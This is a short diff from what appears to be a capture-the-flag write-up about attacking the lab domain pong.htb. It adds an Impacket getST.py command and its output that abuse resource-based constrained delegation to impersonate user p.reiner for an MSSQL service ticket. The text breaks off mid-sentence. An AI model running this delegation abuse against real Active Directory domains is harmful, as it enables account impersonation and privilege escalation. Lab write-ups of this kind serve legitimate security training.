@@ -823,5 +823,13 @@ Ill configure RBCD on the sql service account
 ```python
 ❯❯❯ export KRB5CCNAME=pong_gmsa.ccache 
 
+❯❯❯ faketime -f +8h getST.py pong.htb/Pong_gMSA$ -impersonate p.reiner -spn mssqlsvc/dc2.pong.htb -k -no-pass
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
+[*] Impersonating p.reiner
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in p.reiner@mssqlsvc_dc2.pong.htb@PONG.HTB.ccache
 ```
+
+Then after making sure to export the pong gmsa account TGT i can request a ticket for the 
